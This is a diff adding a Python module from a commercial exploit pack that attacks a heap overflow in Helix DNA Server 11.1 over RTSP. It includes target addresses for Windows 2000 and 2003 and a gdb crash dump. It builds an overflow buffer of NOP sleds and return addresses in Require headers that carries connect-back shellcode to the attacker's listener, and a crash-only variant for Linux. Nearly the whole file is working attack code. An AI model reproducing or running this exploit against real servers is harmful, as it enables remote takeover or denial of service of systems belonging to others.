@@ -1,0 +1,213 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+
+import sys
+
+if "." not in sys.path:
+    sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "Helix DNA Server 11.1 Heap Overflow"
+
+DESCRIPTION = "Heap overflow vulnerability in Helix DNA Server"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2007.08.24"
+DOCUMENTATION["References"] = "http://labs.musecurity.com/wp-content/uploads/2007/08/mu-200708-01.txt"
+DOCUMENTATION["VersionsAffected"] = "Versions 11.x < 11.1.4"
+DOCUMENTATION["CVE Name"] = "CVE-2006-3276"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3276"
+DOCUMENTATION["Notes"] = """
+The Windows exploit is not 100% reliable. This exploit must be launched against a server
+recently started.
+"""
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux", "Windows"] ]
+
+NOTES = """
+To debug on Linux, start Helix Server with these options:
+
+Bin/hlxserver --nca --acd --nar --sct --sdm --dhb hlxserver.cfg
+
+[...]
+#0  0x081bec43 in CMIMEHeader::~CMIMEHeader ()
+(gdb) info reg
+eax            0x58585858       1482184792
+ecx            0x8ccf434        147649588
+edx            0x8f9c880        150587520
+ebx            0x830e734        137422644
+esp            0xb77fa040       0xb77fa040
+ebp            0xb77fa058       0xb77fa058
+esi            0x8f9c7b0        150587312
+edi            0x89e6aac        144599724
+eip            0x81bec43        0x81bec43 <CMIMEHeader::~CMIMEHeader()+211>
+eflags         0x202    [ IF ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) x /i 0x81bec43
+0x81bec43 <_ZN11CMIMEHeaderD0Ev+211>:   call   *0x8(%eax)
+[...]
+
+Tested on Debian Etch 4.0.
+"""
+
+CHANGELOG = """
+"""
+	
+targets = {    
+    0 : [ "Linux (DoS)" ],
+    1 : [ "Windows 2000 SP4 English", 0x78527F60, 0x779CFFBB ], # pointer to a call [eax+10] | add esp,14 @ oleaut32.dll    
+    2 : [ "Windows 2003 SP2 English (no NX)", 0x7623C76C, 0x77BDE250 ], # pointer to a call [eax+10] | add esp,14 @ msvcr71.dll    
+}
+
+class theexploit (tcpexploit):
+
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.setPort(554)
+		self.setHost("")
+		self.version = 0
+		return
+
+	def getVersion(self):
+		self.log("Get version for Helix DNA Server at %s:%d"%(self.host,self.port))
+		s = self.gettcpsock()
+		try:
+			s.connect((self.host, self.port))
+		except:
+			self.log("Failed to connect.")
+			return 0
+
+		self.websend(s,"OPTIONS / RTSP/1.0\r\n\r\n")
+		data = self.webrecv(s)		
+
+		if data.find("win32") != -1:
+			self.log("Version: win32")
+			#self.version = 1
+			return 1
+
+		if data.find("linux") != -1:
+			self.log("Version: linux")
+			#self.version = 2
+			return 1
+
+		return 0
+
+	def neededListenerTypes(self):
+		from canvasengine import WIN32MOSDEF
+		return [WIN32MOSDEF]
+    
+	def createShellcode(self):
+		self.badstring="\x00\r\n:"
+		return self.createSmallWin32Shellcode(self.callback.ip, self.callback.port, subesp = 1500)
+
+	
+	def run(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+		self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
+
+		self.getVersion()
+		if self.version == 0:
+			self.log("Can't get version.")
+			self.setInfo("%s attacking %s:%d - done (failed!)"%(NAME,self.host,self.port))
+			return 0
+		
+		self.log("Attacking %s:%d"%(self.host,self.port))
+		s = self.gettcpsock()
+		try:
+			s.connect((self.host, self.port))
+		except:
+			self.log("Failed to connect.")
+			return 0
+
+		if self.version == 0:
+			dosstring = ""
+			dosstring += "DESCRIBE / RTSP/1.0\r\n"
+			dosstring += "Require: AAAAAAAAAAAAAAAAAAAAAAAA\r\n"
+			dosstring += "Require: AAAAAAAAAAAA\r\n"
+			dosstring += "Require: AAAAAAAAAAAA\r\n"
+			dosstring += "Require: AAAAAXXXXAAAAAAA\r\n"
+			dosstring += "Require: AAAAAAAAAAAAAAAAAAAA\r\n"
+			dosstring += "\r\n"
+
+		if self.version > 0:
+			os_name, call_eax, add_esp = targets[self.version]
+			
+			ret = str(struct.pack('<L', call_eax))			
+			ret2 = str(struct.pack('<L', add_esp))
+			
+			data = "\x90"*267			
+			
+			tmp = data[0:8]
+			tmp += self.shellcode
+			tmp += data[8 + len(self.shellcode):]
+									
+			dosstring = ""
+			dosstring += "DESCRIBE / RTSP/1.0\r\n"
+			dosstring += "Require: " + "\xeb\x33" + "AAAAAAAAAAAAAAAAAAAAAA\r\n"			
+			dosstring += "Require: AAAAAAAAAAAA\r\n"
+			dosstring += "Require: AAAAAAAAAAAA\r\n"
+			dosstring += "Require: " + "\x90"*366 + "\xeb\x16\x90" + ret + "EEEEEEEEEEEE" + ret2 + tmp + "\r\n"
+			dosstring += "Require: AAAAAAAAAAAAAAAAAAAA\r\n"
+			dosstring += "\r\n"
+		
+		try:
+			self.websend(s,dosstring)
+			self.log("Done sending attack buffer.")
+		except:
+			self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
+			s.close()
+			return 0
+
+		self.log("Trying to connect again.")
+
+		try:
+			s.connect((self.host, self.port))
+			self.log("We connected - it did not die - it must be patched.")
+			s.close()
+			ret = 0
+		except:
+			self.log("Could not connect .. good .. Helix DNA Server is died.")
+			ret = 1
+
+		self.log("Done with exploit (success!)")
+		self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
+		return ret
+
+	def usage(self):
+		print "Usage: %s -v version -t host -l localip -d localport\n" % sys.argv[0]
+        
+		i = 0
+        
+		print 'Available versions:'
+        
+		for listline in targets.values():
+			print '\t%d: %s'%(i, listline[0])
+			i = i + 1
+        
+		sys.exit(0) 
+
+if __name__ == '__main__':
+	app = theexploit()
+	ret = standard_callback_commandline(app)
+
